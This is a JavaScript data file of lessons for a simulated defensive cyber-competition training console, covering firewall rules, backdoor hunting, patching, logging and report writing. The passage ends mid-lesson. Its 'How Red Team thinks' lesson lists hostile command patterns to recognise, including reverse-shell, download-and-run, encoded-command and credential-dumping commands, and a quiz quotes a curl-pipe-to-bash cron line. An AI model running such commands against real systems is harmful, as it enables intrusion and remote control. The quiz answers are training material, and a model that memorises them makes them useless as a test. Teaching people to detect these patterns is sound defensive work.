// The second half of the Learn-mode curriculum. See ccdcAcademy.js for the step format.
import { stageAttack } from '../game/ccdcRed.js';
import { NAT, PW, PW2, adPw, login, winLogin, waitCommit } from './ccdcAcademyKit.js';

const KW = (st, dev) => st.devState[dev];

export const MORE_LESSONS = [
  {
    id: 'editors', title: 'Editing files: nano and vi', mins: 15, vms: ['web', 'ecom'],
    steps: [
      { say: 'Sooner or later you have to change a file by hand. There are two editors. nano is easy. vi is on nearly every Linux machine, sometimes as the only choice, and it confuses everyone the first time. Learn just enough of both.' },
      login('web', 'Ubuntu Srv'),
      { vm: 'web', say: 'Always copy a config before editing it.', type: 'cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak' },
      { vm: 'web', edit: { tool: 'nano', path: '/etc/ssh/sshd_config', find: 'X11Forwarding yes', replace: 'X11Forwarding no' }, say: 'Type: nano /etc/ssh/sshd_config\n\nUse the arrow keys to reach X11Forwarding yes, change yes to no.\n\nCtrl+O saves: it shows the file name, press Enter.\nCtrl+X exits.\n\nThe bottom of the screen always lists the keys. ^ means Ctrl.', done: (c) => /X11Forwarding no/.test(KW(c.st, 'web').fs['/etc/ssh/sshd_config']), after: 'Saved. Back at the shell.' },
      { vm: 'web', type: 'grep X11 /etc/ssh/sshd_config', look: 'Read it back. Never assume a save worked.' },
      login('ecom', 'CentOS'),
      { vm: 'ecom', say: 'A minimal CentOS install does not have nano. Watch.', type: 'nano /etc/ssh/sshd_config', browser: true, simLine: true, done: (c) => c.ran('ecom', /^nano /), after: 'Command not found, so here it is vi or nothing.' },
      { say: 'vi has modes, which is the whole trick.\n\nNormal mode: keys are commands. You start here.\nInsert mode: keys type text. Press i to enter it.\nEsc always goes back to normal mode.\n\nTo leave:\n:wq then Enter  saves and quits\n:q! then Enter  quits and throws away your changes\n\nIf vi is doing something strange, press Esc and then type :q! to get out safely.\n\nIn normal mode: arrows move, dd deletes a line, u undoes, /word searches, n finds the next one.' },
      { vm: 'ecom', edit: { tool: 'vi', path: '/etc/ssh/sshd_config', find: 'PermitRootLogin yes', replace: 'PermitRootLogin no' }, say: 'Type: vi /etc/ssh/sshd_config\n\nPress /  type PermitRootLogin  press Enter. That jumps to the line.\nMove the cursor to the word yes.\nPress i to enter insert mode, then fix the text so it says no. Backspace works here.\nPress Esc.\nType :wq and press Enter.', done: (c) => /PermitRootLogin no/.test(KW(c.st, 'ecom').fs['/etc/ssh/sshd_config']), after: 'You just used vi.' },
      { vm: 'ecom', type: 'systemctl restart sshd', after: 'A changed config does nothing until the service re-reads it.' },
      { vm: 'ecom', drill: true, edit: { tool: 'vi', path: '/etc/my.cnf', find: 'bind-address=0.0.0.0', replace: 'bind-address=127.0.0.1' }, say: 'On your own with vi: in /etc/my.cnf, change bind-address to 127.0.0.1 so the database only listens on this machine.', type: 'vi /etc/my.cnf', done: (c) => /bind-address=127\.0\.0\.1/.test(KW(c.st, 'ecom').fs['/etc/my.cnf']), after: 'Good. On a real box you would now restart mariadb and test the store.' },
      { ask: { q: 'You are stuck in vi and do not want to save. What do you press and type?', a: /esc.*:q!|:q!/i, sample: 'Esc then :q!', why: 'Esc gets you to normal mode, and :q! leaves without saving.' } },
    ],
  },
  {
    id: 'pan2', title: 'Palo Alto: logs, blocking, outbound', mins: 15, vms: ['pan', 'dns'],
    steps: [
      { say: 'Once inbound is locked down, there are three more firewall jobs: read what is hitting you, block a single attacker, and control what your own machines can reach.' },
      login('pan', 'Palo Alto', 'admin'),
      { vm: 'pan', type: 'show log traffic last 50 direction equal backward', parts: [['show log traffic', 'the traffic log'], ['last 50', 'how many entries'], ['direction equal backward', 'newest first']], look: 'Source, destination, port, which rule, what happened.' },
      { vm: 'pan', type: 'show session all', look: 'What is connected through the firewall right now.' },
      { vm: 'pan', type: 'configure' },
      { vm: 'pan', say: 'The packet allows blocking a single address that is attacking you. Never a subnet.', type: 'set rulebase security rules block-one from Core to any source 198.51.100.61 destination any application any service any action deny' },
      { vm: 'pan', say: 'A new rule goes on the bottom, below anything that might match first. Move it up.', type: 'move rulebase security rules block-one top', after: 'First match wins, so order is everything.' },
      { vm: 'pan', say: 'Now take away the allow-all. Be careful: this also ends your machines\' way out to the internet.', type: 'delete rulebase security rules allow-all' },
      { vm: 'pan', type: 'commit' },
      { vm: 'pan', type: 'exit' },
      waitCommit('pan'),
      login('dns', 'Debian'),
      { vm: 'dns', say: 'Try to reach the internet.', type: 'apt-get update', expectFail: /Could not connect/, after: 'Blocked. The interzone default denies outbound too. That stops Red Team\'s callbacks, and your patching.' },
      { vm: 'pan', say: 'Allow outbound only when you need it. Web and DNS only.', type: 'configure' },
      { vm: 'pan', type: 'set rulebase security rules out-patch from [ Public Internal User ] to Core source any destination any application [ web-browsing ssl dns ] service application-default action allow' },
      { vm: 'pan', type: 'commit' },
      { vm: 'pan', type: 'exit' },
      waitCommit('pan'),
      { vm: 'dns', say: 'Try again. The error should be different now, and that one is the next lesson\'s problem.', type: 'apt-get update', expectFail: /404/, after: 'Outbound works. It also means a planted callback can phone home again. Open it to patch, then disable it.' },
      { vm: 'pan', type: 'configure' },
      { vm: 'pan', type: 'set rulebase security rules out-patch disabled yes' },
      { vm: 'pan', type: 'commit', after: 'Off again. Disabling keeps the rule ready for next time.' },
      { vm: 'pan', type: 'exit' },
      { ask: { q: 'You blocked a whole /24 because attacks came from it. Allowed? (yes or no)', a: /^n/i, sample: 'no', why: 'A single address is allowed. A subnet is prohibited by the packet.' } },
    ],
  },
  {
    id: 'deeplinux', title: 'Harder backdoors on Linux', mins: 18, vms: ['web', 'dns', 'mail', 'ecom', 'uwks'],
    steps: [
      { say: 'Red Team are professionals, so they go beyond a cron job. Here are the tricks that catch teams out.' },
      login('web', 'Ubuntu Srv'),
      { vm: 'web', type: 'cat /root/.ssh/authorized_keys', look: 'A key labelled ops@kali. Kali is the attacker\'s Linux.' },
      { vm: 'web', say: 'Delete it.', type: 'rm /root/.ssh/authorized_keys', expectFail: /Operation not permitted/, after: 'Root was refused. Something has locked the file.' },
      { vm: 'web', type: 'lsattr /root/.ssh/authorized_keys', parts: [['lsattr', 'list a file\'s special attributes']], look: 'The i means immutable: nobody can change it, even root, until the flag comes off.' },
      { vm: 'web', type: 'chattr -i /root/.ssh/authorized_keys', parts: [['chattr -i', 'remove the immutable flag']] },
      { vm: 'web', type: 'sed -i "/ops@kali/d" /root/.ssh/authorized_keys', parts: [['/ops@kali/d', 'delete lines containing that text']], done: (c) => !/ops@kali/.test(KW(c.st, 'web').fs['/root/.ssh/authorized_keys']), after: 'Gone, and now you know why a delete can fail as root.' },
      { vm: 'web', type: 'cat /etc/shadow', look: 'Password hashes. $6$ is strong SHA-512. $1$ is old MD5, which cracks fast.' },
      { ask: { q: 'Which account has the weak $1$ hash?', a: /webmaint/i, sample: 'webmaint', seen: true, why: 'Attackers set these up, or crack them, and reuse them.' } },
      login('dns', 'Debian'),
      { vm: 'dns', say: 'Things that run at boot: rc.local is the oldest.', type: 'cat /etc/rc.local', look: 'A dot at the start of a file name hides it from plain ls.' },
      { ask: { q: 'What program does it start?', a: /kworker/i, sample: '.kworker', seen: true, why: 'kworker is the name of a normal kernel thread, used here to look harmless.' } },
      { vm: 'dns', type: 'sed -i "/kworker/d" /etc/rc.local', done: (c) => !/kworker/.test(KW(c.st, 'dns').fs['/etc/rc.local']) },
      { vm: 'dns', type: 'rm /usr/bin/.kworker' },
      login('mail', 'Fedora'),
      { vm: 'mail', say: 'Timers are the newer cron.', type: 'systemctl list-timers', look: 'A helper timer nobody set up.' },
      { vm: 'mail', type: 'cat /usr/local/sbin/dbus-helper', look: 'bash -i >& /dev/tcp/... is a reverse shell: this machine calls the attacker and hands over a shell. Memorize how that looks.' },
      { vm: 'mail', type: 'systemctl disable --now dbus-helper.timer', parts: [['disable', 'do not start at boot'], ['--now', 'and stop it right now']] },
      { vm: 'mail', type: 'rm /etc/systemd/system/dbus-helper.timer' },
      { vm: 'mail', type: 'rm /etc/systemd/system/dbus-helper.service' },
      { vm: 'mail', type: 'rm /usr/local/sbin/dbus-helper' },
      login('ecom', 'CentOS'),
      { vm: 'ecom', say: 'This one is nasty. It forces a library into every program on the machine, which can hide files and steal passwords.', type: 'cat /etc/ld.so.preload', look: 'On a normal system this file does not exist.' },
      { vm: 'ecom', type: 'rm /etc/ld.so.preload', after: 'Gone. A rootkit means you cannot trust what the box shows you, so a Tech Support restoration may be the honest answer.' },
      { vm: 'ecom', say: 'CentOS and Fedora have SELinux, which can block a service even when everything looks right.', type: 'getenforce', look: 'Enforcing. If a service fails after you move its files, suspect this.' },
      login('uwks', 'Ubuntu Wkst'),
      { vm: 'uwks', type: 'cat /root/.bashrc', look: 'This runs at every login. An alias can turn sudo into something else.' },
      { vm: 'uwks', drill: true, say: 'On your own: remove the alias sudo line from /root/.bashrc using sed or an editor.', type: "sed -i '/alias sudo/d' /root/.bashrc", done: (c) => !/alias sudo/.test(KW(c.st, 'uwks').fs['/root/.bashrc']), after: 'Done.' },
      { vm: 'uwks', say: 'SUID makes a program run as its owner, usually root.', type: 'find / -perm -4000', look: 'passwd and sudo are expected. An interpreter like Python is not.' },
      { ask: { q: 'Which one should not have SUID?', a: /python/i, sample: '/usr/bin/python3.8', seen: true, why: 'SUID on an interpreter hands root to anyone.' } },
      { vm: 'uwks', type: 'chmod u-s /usr/bin/python3.8' },
    ],
  },
  {
    id: 'evict', title: 'Someone is on the box right now', mins: 10, vms: ['mail'],
    steps: [
      { say: 'An attacker is logged in, live. Work in this order:\n\n1. Save evidence: who, from where, when.\n2. Close the door: change the password.\n3. Kick them off.\n4. Remove what they left.\n5. Write it up.\n\nIf you kick first, they log straight back in. Get the order right.' },
      login('mail', 'Fedora'),
      { vm: 'mail', setup: (st) => { stageAttack(st, 'mail', { tag: 'cron', account: 'root' }); }, say: 'Who is on this machine?', type: 'who', look: 'A login on a pts terminal from an outside address.' },
      { ask: { q: 'Which address are they connected from?', a: (st) => new RegExp(st.engine.red.ip.replace(/\./g, '\\.')), sample: (st) => st.engine.red.ip, seen: true, why: 'Write it down, with the time.' } },
      { vm: 'mail', type: 'ss -antp', parts: [['-a', 'all sockets, not only listening'], ['-t', 'TCP'], ['-n', 'numbers'], ['-p', 'which program']], look: 'ESTAB lines to an outside address are live connections.' },
      { vm: 'mail', type: 'ps aux', look: 'Compare to what you saw earlier. What is new?' },
      { vm: 'mail', say: `Door first. Change root's password to ${PW}, typing it twice.`, type: 'passwd root', testLines: [PW, PW], done: (c) => KW(c.st, 'mail').creds.root.strong },
      { vm: 'mail', say: 'Now kick them. pts/7 is the terminal from the who output.', type: 'pkill -9 -t pts/7', parts: [['pkill', 'kill by matching'], ['-9', 'no chance to clean up'], ['-t pts/7', 'everything on that terminal']], done: (c) => KW(c.st, 'mail').live.sessions.length === 0, after: 'Gone, and the password they used no longer works.' },
      { vm: 'mail', type: 'ls /etc/cron.d', look: 'What did they leave?' },
      { vm: 'mail', drill: true, say: 'On your own: remove what they planted.', type: (st) => `rm ${st.engine.red.implants.find((i) => i.dev === 'mail').path}`, done: (c) => !c.st.engine.red.implants.some((i) => i.dev === 'mail' && KW(c.st, 'mail').fs[i.path] !== undefined), after: 'Evicted. Now the incident report. Do it while it is fresh.' },
      { ask: { q: 'Why change the password before kicking them off?', a: /(back|again|relog|re-log|return)/i, sample: 'they would log back in', why: 'Kicking only ends the session. The door is still open until the password changes.' } },
    ],
  },
  {
    id: 'windeep', title: 'Windows: logs, startup, Kerberos', mins: 18, vms: ['ad', 'win10'],
    steps: [
      { say: 'Beyond the first pass: read the logs, find what starts automatically, and fix the domain settings.' },
      winLogin('ad', '2019 AD'),
      { vm: 'ad', say: 'Failed logins.', type: "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 5 | Format-List TimeCreated,Id,Message", parts: [['-FilterHashtable', 'which log and event number'], ['-MaxEvents 5', 'only the newest five'], ['| Format-List ...', 'show the whole message; a table cuts it off']], look: 'Read the source address in the message.' },
      { ask: { q: 'Which address was guessing passwords?', a: /198\.51\.100\.61/, sample: '198.51.100.61', seen: true, why: 'Many 4625s from one address is password guessing.' } },
      { vm: 'ad', say: 'Then look for a successful login, an account created, and a group change.', type: "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4720,4728} -MaxEvents 5 | Format-List TimeCreated,Id,Message", look: '4720 created, 4728 added to a group. Together that is a backdoor admin being made.' },
      { vm: 'ad', type: 'Get-ADDefaultDomainPasswordPolicy', look: 'Minimum length of 7 is weak. Note the lockout threshold.' },
      { vm: 'ad', say: 'Raise the minimum length. Do not turn on account lockout casually: Red Team can lock out the accounts POP3 uses on purpose, and then you fail the scored check.', type: 'Set-ADDefaultDomainPasswordPolicy -Identity driftless.local -MinPasswordLength 14 -ComplexityEnabled $true' },
      { vm: 'ad', say: 'Kerberoasting: any account with an SPN can have its password cracked offline by any domain user.', type: 'setspn -Q */*', look: 'Service accounts listed here need very long passwords.' },
      { ask: { q: 'Which account has an SPN here?', a: /backup/i, sample: 'Backup Service', seen: true, why: 'Give it a long random password. Check first whether a service uses it.' } },
      { vm: 'ad', say: 'krbtgt signs every Kerberos ticket. If Red Team stole it, they can forge a ticket for anyone, a Golden Ticket. Reset it twice to invalidate old tickets. On a real production domain you wait for replication between resets.', type: adPw('krbtgt'), done: (c) => c.ran('ad', /set-adaccountpassword .*krbtgt/i) },
      { vm: 'ad', type: 'Get-MpComputerStatus', look: 'Check RealTimeProtectionEnabled. Attackers turn Defender off.' },
      winLogin('win10', 'Win 10'),
      { vm: 'win10', type: 'netstat -ano', parts: [['-a', 'all'], ['-n', 'numbers'], ['-o', 'process ID']], look: 'ESTABLISHED to outside addresses. The last column is the program\'s PID.' },
      { vm: 'win10', type: 'Get-Process', look: 'Match the PID.' },
      { vm: 'win10', say: 'Programs that start at login.', type: 'reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', look: 'Anything launching from ProgramData or Temp is suspicious.' },
      { ask: { q: 'What is the name of the suspicious entry?', a: /onedrivehelper/i, sample: 'OneDriveHelper', seen: true, why: 'A real product name, on a program in the wrong folder.' } },
      { vm: 'win10', type: 'reg delete HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OneDriveHelper /f', done: (c) => !KW(c.st, 'win10').live.runKeys.some((k) => k.name === 'OneDriveHelper') },
      { vm: 'win10', type: 'Get-ScheduledTask', look: 'Something here should not be on this PC. A vendor name proves nothing.' },
      { vm: 'win10', drill: true, say: 'On your own: remove the AdobeGCInvoker task with Unregister-ScheduledTask.', type: 'Unregister-ScheduledTask -TaskName AdobeGCInvoker -Confirm:$false', done: (c) => !KW(c.st, 'win10').live.tasks.some((t) => t.TaskName === 'AdobeGCInvoker'), after: 'Removed.' },
    ],
  },
  {
    id: 'otherservices', title: 'Testing every scored service by hand', mins: 12, vms: ['dns', 'mail'],
    steps: [
      { say: 'The 2026 regional scored more than the five here: HTTP, HTTPS, SMTP, POP3, DNS, FTP, TFTP and NTP. Read your packet for your list. Learn to test each one yourself, because the status page lags.' },
      login('dns', 'Debian'),
      { vm: 'dns', type: 'dig @127.0.0.1 web.driftless.local', parts: [['dig', 'ask a DNS server a question'], ['@127.0.0.1', 'ask this machine']], look: 'An answer with an address means it works.' },
      { vm: 'dns', type: 'ntpq -p', look: 'A * in front of a server means it is synced.' },
      login('mail', 'Fedora'),
      { vm: 'mail', say: 'Is the mail port even answering?', type: 'nc -zv localhost 25', parts: [['nc', 'connect to a port'], ['-z', 'just test, send nothing'], ['-v', 'say what happened']] },
      { vm: 'mail', type: 'nc -zv localhost 110' },
      { say: 'Port open is not enough. You can speak these protocols yourself.\n\nPOP3:\nnc localhost 110\nUSER a.hansen\nPASS (their password)\nLIST\nQUIT\n\nSMTP:\nnc localhost 25\nHELO test\nMAIL FROM:<a@driftless.local>\nRCPT TO:<b@driftless.local>\nDATA\nhello\n.   (a single dot on its own line ends the message)\nQUIT\n\nThis console does not simulate those conversations. On a real box, +OK and 250 are the good replies.' },
      { say: 'FTP: login with a test account, or anonymous if it is meant to be open, then ls. The scorer checks that certain files exist, so do not delete or move them. FTP sends passwords in the clear, so never reuse a good one.\n\nTFTP has no login at all. The scorer pulls a small file and checks its integrity. Do not change that file.\n\nNTP: the scorer checks time. Do not block UDP 123 on a box that serves it.' },
      { ask: { q: 'A service is listening, but the scorer says it is failing. Name one reason that could be.', a: /(content|page|password|account|login|file|config|auth|firewall|function)/i, sample: 'the page content changed', why: 'Scored means functional. Content, credentials and the files it expects all count.' } },
    ],
  },
  {
    id: 'patching', title: 'Patching systems nobody supports', mins: 12, vms: ['dns', 'ecom'],
    steps: [
      { say: 'These operating systems are past end of life, and their update servers have moved or gone. Knowing the fix saves an hour. Also check whether your firewall allows outbound, and whether the competition proxy lets you reach the address. The packet says internet access goes through a proxy with a set list of sites.\n\nDo not start big upgrades during the competition. Update only what you need, and snapshot nothing, because you cannot. A failed kernel update on a scored box is your own outage.' },
      login('dns', 'Debian'),
      { vm: 'dns', type: 'apt-get update', expectFail: /404/, after: 'Debian moved old releases to archive.debian.org.' },
      { vm: 'dns', type: 'cat /etc/apt/sources.list' },
      { vm: 'dns', type: 'sed -i "s/ftp.debian.org/archive.debian.org/" /etc/apt/sources.list', done: (c) => /archive\.debian\.org\/debian/.test(KW(c.st, 'dns').fs['/etc/apt/sources.list']) },
      { vm: 'dns', type: 'sed -i "s/security.debian.org/archive.debian.org\\/debian-security/" /etc/apt/sources.list' },
      { vm: 'dns', type: 'apt-get update', expectFail: /expired/, after: 'New error. The archive\'s signature date has passed, and apt refuses by default.' },
      { vm: 'dns', type: 'apt-get -o Acquire::Check-Valid-Until=false update', parts: [['-o Acquire::Check-Valid-Until=false', 'accept the expired date, for this one run']], after: 'That is how you get a package onto an old Debian box.' },
      login('ecom', 'CentOS'),
      { vm: 'ecom', type: 'yum check-update', expectFail: /valid baseurl/, after: 'CentOS 7 ended in 2024. The mirror list server is gone. Its packages are on vault.centos.org.' },
      { vm: 'ecom', say: 'Stop using the mirror list.', type: "sed -i 's/^mirrorlist/#mirrorlist/' /etc/yum.repos.d/CentOS-Base.repo" },
      { vm: 'ecom', say: 'Point the commented-out baseurl at the vault. Using | as the separator saves escaping all the slashes.', type: "sed -i 's|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|' /etc/yum.repos.d/CentOS-Base.repo" },
      { vm: 'ecom', type: 'yum clean all' },
      { vm: 'ecom', type: 'yum check-update', after: 'Working. Fedora 21 is the same idea, at archives.fedoraproject.org/pub/archive/fedora/linux/releases/21/.' },
      { say: 'Ubuntu old releases normally move to old-releases.ubuntu.com. 14.04 was still on the main mirrors the last time I could confirm, so try it first, and swap the address if you get 404s.\n\nWindows: check Windows Update for what is allowed. Patches for EternalBlue (MS17-010) and Zerologon (CVE-2020-1472) matter most on old Windows servers.' },
    ],
  },
  {
    id: 'docker', title: 'Docker on the box', mins: 8, vms: ['docker'],
    steps: [
      { say: 'A container is a program packaged with everything it needs. The packet says you may containerize a service, as long as it keeps the same public address and name.\n\nFor defense: an exposed Docker port is equal to root on that machine.' },
      winLogin('docker', '2019'),
      { vm: 'docker', type: 'docker ps', parts: [['docker ps', 'running containers']] },
      { vm: 'docker', type: 'docker images', look: 'What is stored here.' },
      { vm: 'docker', type: 'docker inspect maint', look: 'Privileged true and a mount of the host drive mean it can do anything to the host.' },
      { vm: 'docker', type: 'docker logs maint', look: 'What it has been doing.' },
      { ask: { q: 'Which outside address was it connecting to?', a: /198\.51\.100\.61/, sample: '198.51.100.61', seen: true, why: 'socat ... EXEC:/bin/sh is another reverse shell.' } },
      { vm: 'docker', type: 'docker rm -f maint' },
      { say: 'To run a service in a container, the pattern is:\n\ndocker run -d --name web -p 80:80 -v /srv/site:/usr/share/nginx/html nginx\n\n-d runs in the background\n-p outside port : inside port\n-v folder on the host : folder inside\n\nThis console does not actually run containers. Practice this one on your own machine if you can.' },
    ],
  },
  {
    id: 'splunkops', title: 'Getting logs into Splunk', mins: 10, vms: ['splunk', 'web'],
    steps: [
      { say: 'Do not assume logs are flowing. Often, setting this up is your job. Splunk is a sponsor, and the packet explicitly encourages free accounts and downloads from it.\n\nThe server listens on 9997. Each machine runs a small Universal Forwarder that sends files to it.' },
      login('splunk', 'Splunk'),
      { vm: 'splunk', say: 'Tell the server to receive.', type: '/opt/splunk/bin/splunk enable listen 9997' },
      login('web', 'Ubuntu Srv'),
      { vm: 'web', say: 'Tell the forwarder where to send.', type: '/opt/splunkforwarder/bin/splunk add forward-server 172.20.241.20:9997' },
      { vm: 'web', say: 'Tell it what to send.', type: '/opt/splunkforwarder/bin/splunk add monitor /var/log/auth.log' },
      { vm: 'web', type: '/opt/splunkforwarder/bin/splunk add monitor /var/log/apache2/access.log', after: 'CentOS and Fedora: /var/log/secure and /var/log/httpd/access_log. Port 9997 also has to be allowed through the firewalls.' },
      { say: 'Windows: install the Universal Forwarder and pick the Security, System and Application logs in the setup screen.\n\nField names depend on the data. A raw Apache log calls the client clientip, not src_ip. Click an event, or read the field list on the left, to see the real names.\n\nUseful habit: save a good search as an alert so that it tells you. Failed logins, new accounts and group changes are the first three to set up.' },
      { ask: { q: 'Which port does a forwarder send to by default?', a: /9997/, sample: '9997', why: 'Splunk\'s default receiving port.' } },
    ],
  },
  {
    id: 'injecttypes', title: 'The injects you are likely to get', mins: 18, vms: ['ad', 'web'],
    steps: [
      { say: 'From past Midwest packets: the scenario says the company is adopting a security framework built from NIST 800-53, NIST 800-171, the NIST Cybersecurity Framework, ISO 27001/27002, the CIS Controls and CMMC, and that management wants a Disaster Recovery Plan for a critical service. Expect injects around those.\n\nCommon types:\nInventory or network diagram\nPolicy: passwords, acceptable use, incident response\nA user or access change\nAn upgrade or service change\nA plan: disaster recovery, backup, patching\nAn audit or compliance response\nA firewall or banner change\nA presentation at larger events' },
      winLogin('ad', '2019 AD'),
      { vm: 'ad', say: 'Technical injects get checked on the box, so do the work and then write it up. HR asks for a new user.', type: "New-ADUser -SamAccountName j.doe -Name 'Jane Doe' -AccountPassword (ConvertTo-SecureString 'Temp-Maple-71-Road' -AsPlainText -Force) -Enabled $true -ChangePasswordAtLogon $true", done: (c) => !!c.st.devState.ad.dir?.lookup('j.doe') || c.ran('ad', /new-aduser/i), after: 'Created, with a temporary password. Least privilege: no admin groups.' },
      { vm: 'ad', type: "Get-ADUser j.doe" , look: 'Verify, then paste this into your memo as evidence.' },
      login('web', 'Ubuntu Srv'),
      { vm: 'web', say: 'Legal wants a warning banner before login.', type: "echo 'Authorized use only. Activity is monitored.' > /etc/issue.net", done: (c) => /Authorized/.test(KW(c.st, 'web').fs['/etc/issue.net'] || '') },
      { vm: 'web', type: "echo 'Banner /etc/issue.net' >> /etc/ssh/sshd_config" },
      { vm: 'web', type: 'service ssh restart', after: 'Show your work in the memo: the file, the setting and that it took effect.' },
      { say: 'Mapping to a framework is simpler than it sounds. A control is a requirement. You say which requirement your action satisfies:\n\nPassword policy: NIST 800-53 IA-5, CIS Control 5\nLeast privilege: NIST AC-6, CIS 6\nLogging: NIST AU-2 and AU-6, CIS 8\nBackups and recovery: NIST CP-9 and CP-10, CIS 11\nPatching: NIST SI-2, CIS 7\nIncident response: NIST IR-4, CIS 17\n\nA line like "This satisfies NIST 800-53 AC-6" is often what separates a good memo from an average one.' },
      { write: { starter: 'To: Executive Team\nFrom: IT Team\nDate: November 14, 2026\nSubject: Disaster recovery plan for the online store\n\n', inject: { title: 'Disaster recovery plan', points: 100, model: 'Names the critical service, sets RTO and RPO, covers backups and where they are kept, step-by-step recovery, who does what, how it is tested, and maps to a control such as NIST CP-9/CP-10.', prompt: 'Write a short Disaster Recovery Plan for the online store. Management needs to know how quickly we can recover, what we back up, and who does what.', rubric: [
        { label: 'names the critical service', re: /store|e-?comm|shop/i },
        { label: 'states recovery time and data-loss targets (RTO, RPO)', re: /\brto\b|recovery time/i },
        { label: 'covers what is backed up and how often', re: /backup|back up/i },
        { label: 'gives recovery steps', re: /restore|rebuild|recover/i },
        { label: 'names who is responsible', re: /responsib|owner|team lead|administrator|assigned/i },
        { label: 'says how the plan is tested', re: /test|exercise|drill/i },
      ] } }, say: 'This is the exact kind of thing the packet warns about. Write it.' },
    ],
  },
  {
    id: 'redplaybook', title: 'How Red Team thinks', mins: 10, vms: [],
    steps: [
      { say: 'Knowing the order they work in tells you where to look.\n\n1. Scan: find open ports.\n2. Default passwords: first, because it is free.\n3. Exploit old services: EternalBlue, Shellshock, web apps.\n4. Persist: accounts, keys, cron, tasks, services, web shells.\n5. Move sideways: reused passwords, domain admin.\n6. Disrupt: from midday, stop services, wipe files, deface pages.\n\nIn a four-hour event all of this is compressed.' },
      { say: 'Things that should make you stop and read:\n\nbash -i >& /dev/tcp/    reverse shell\nnc -e, socat EXEC       reverse shell\ncurl ... | bash         download and run\nbase64 -d | sh          hidden command\npowershell -enc         hidden PowerShell\nmimikatz, procdump lsass    stealing Windows passwords\nnew accounts named like services\nanything running from /tmp, /dev/shm or C:\\ProgramData' },
      { say: 'Also remember the noise. The packet warns that traffic generators create normal and suspicious traffic from random addresses. White and Green team members also log in to your machines for scoring and support, so an unexpected login is not always an attacker. Confirm before you report or block.\n\nDo not attack back. Port-scanning anything other than your own network is disqualification.' },
      { ask: { q: 'You see: curl -s http://x/a.sh | bash in a cron job. What does it do?', a: /(download|fetch|run|execut|remote)/i, sample: 'downloads a script and runs it', why: 'Whoever controls that address runs anything they like on your box.' } },
      { ask: { q: 'A login you do not recognize appears on your server. Could it be legitimate? (yes or no)', a: /^y/i, sample: 'yes', why: 'The packet says White, Green and Orange team members may access your systems. Check before acting.' } },
      { ask: { q: 'Which comes first for a Red Team: default passwords or writing a custom exploit?', a: /default/i, sample: 'default passwords', why: 'It is free and works often, which is why your first job is passwords.' } },
    ],
  },
  {
    id: 'otherfw', title: 'If your firewall is different', mins: 8, vms: [],
    steps: [
      { say: 'Packets change year to year. The 2026 regional had two Palo Altos and a VyOS router. The 2025 regional menu showed a Cisco FTD. Read yours. The ideas stay the same: zones or interfaces, ordered rules, allow scored traffic first, apply the change. This console only simulates the Palo Alto, so this lesson is reading only.' },
      { say: 'VyOS is a Linux router with its own command line. Default login is commonly vyos / vyos, so check the packet.\n\nshow interfaces\nshow configuration\nconfigure\n  set ...\n  compare\n  commit\n  save\n  exit\n\ncommit makes it live. save makes it survive a reboot. People forget save. Firewall syntax changed between VyOS versions, so press Tab and ? to see what yours accepts.' },
      { say: 'Cisco FTD is usually managed from a web interface, FDM on the box or FMC centrally. The command line is mostly for reading.\n\nThe flow: edit Access Control rules, then click Deploy. Like a commit, nothing happens until deployment, and it can take several minutes. NAT is configured separately from access rules, and for FTD the access rule typically uses the real (inside) address, the opposite of Palo Alto. Check the rule against the docs for your version before you trust it.' },
      { ask: { q: 'On VyOS you ran commit and then the router rebooted. What did you forget?', a: /save/i, sample: 'save', why: 'commit is live, save is permanent.' } },
    ],
  },
  {
    id: 'scripts', title: 'Going faster with scripts', mins: 8, vms: [],
    steps: [
      { say: 'With ten machines, typing the same thing ten times is the enemy. These two shapes cover most of it. The console here does not run loops, so read and understand these, then try them on your own Linux and Windows machines.\n\nBash, for every account with a login shell:\n\nfor u in $(grep -E "bash$" /etc/passwd | cut -d: -f1); do\n  echo "$u: $(openssl rand -base64 12)"\ndone\n\nPipe name:password lines into chpasswd to apply them.' },
      { say: 'PowerShell, a different random password per staff member, saved as a list for the Password Change Request:\n\nGet-ADUser -SearchBase "OU=Staff,DC=driftless,DC=local" -Filter * | ForEach-Object {\n  $p = -join ((48..122) | Get-Random -Count 16 | % {[char]$_})\n  Set-ADAccountPassword $_ -Reset -NewPassword (ConvertTo-SecureString $p -AsPlainText -Force)\n  "$($_.SamAccountName),$p"\n} | Out-File C:\\Users\\Administrator\\pcr.csv\n\nRemember to file the ticket first, and treat that file like the secret it is.' },
      { say: 'What about bringing scripts? At the regional, team GitHub repositories were copied into Nextcloud for all teams to use, and any other private storage was prohibited. USB sticks are not allowed. Ask your captain how it works on Saturday. Only ever run a script you have read and tested.' },
      { ask: { q: 'You found a useful hardening script online during the event. What should you do before running it on a scored box?', a: /(read|test|understand|review)/i, sample: 'read and test it', why: 'A bad script can take down every service at once.' } },
    ],
  },
  {
    id: 'destroy', title: 'When a restart is not enough', mins: 12, vms: ['ad', 'web', 'mail'],
    steps: [
      { say: 'Early in the day Red Team just knocks a service over, and you start it again (that is the Break-fix lesson). After about 14:30 they stop playing nice and break things for good:\n\n- a service stopped AND disabled, so your restart bounces off it\n- the service\'s files deleted outright\n- the whole box wrecked so it will not boot, or rootkitted so you cannot trust it\n\nEach one needs more than systemctl start. Here is all three.' },
      winLogin('ad', '2019 AD'),
      { vm: 'ad', setup: (st) => { const s = KW(st, 'ad').live.winServices.find((x) => x.Name === 'NTDS'); s.Status = 'Stopped'; s.StartType = 'Disabled'; }, say: 'POP3 mail is failing again. The mail box is fine — the scorer signs in with an AD account, and the directory service on the DC is down. Try the obvious fix first.', type: 'Start-Service NTDS', expectFail: /disabled/, after: 'It refused. Red did not just stop NTDS, they set it to Disabled, so a plain start cannot touch it.' },
      { ask: { q: 'Start-Service refused because the service is disabled. What do you have to do before you can start it?', a: /(set-service|startuptype|automatic|enable)/i, sample: 'Set-Service -StartupType Automatic', why: 'A disabled service takes two steps: set the start type back, then start it.' } },
      { vm: 'ad', say: 'Put the start type back to Automatic.', type: 'Set-Service -Name NTDS -StartupType Automatic', parts: [['-StartupType Automatic', 'start at boot again, and allow a manual start now']] },
